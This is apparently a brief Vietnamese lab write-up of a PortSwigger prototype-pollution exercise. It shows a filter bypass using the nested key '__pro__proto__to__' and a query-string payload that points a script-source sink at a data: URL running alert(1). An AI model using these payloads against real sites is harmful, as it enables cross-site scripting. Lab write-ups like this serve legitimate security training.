---
title: Client-side prototype pollution via flawed sanitization
date: 2023-04-19 12:13:13 +0700
categories: [Websec, PortSwigger, Prototype Pollution]
tags: [serverside, prototype_pollution]    # TAG names should always be lowercase
---

1. Nhận thấy trong resource, ở searchLoggerFiltered.js có hàm `sanitizeKey()` sẽ filter các key như `__proto__`, `constructor`, `prototype`
![image](https://user-images.githubusercontent.com/80744099/231054720-4286a5f6-c8c9-4c88-8b78-2316281cccf0.png)
2. Bypass filter bằng payload 
- ```?__pro__proto__to__[testKey]=testValue```
![image](https://user-images.githubusercontent.com/80744099/231054812-7c5a2a99-da82-4363-9c2e-e310e7090e4d.png)
3. Detect sink 
```
let script = document.createElement('script');
script.src = config.transport_url;
document.body.appendChild(script);
```
4. Chèn payload ``?__pro__proto__to__[transport_url]=data:,alert(1)//``
![image](https://user-images.githubusercontent.com/80744099/231056568-4285182b-03c9-4833-b0d4-03f02839ed8e.png)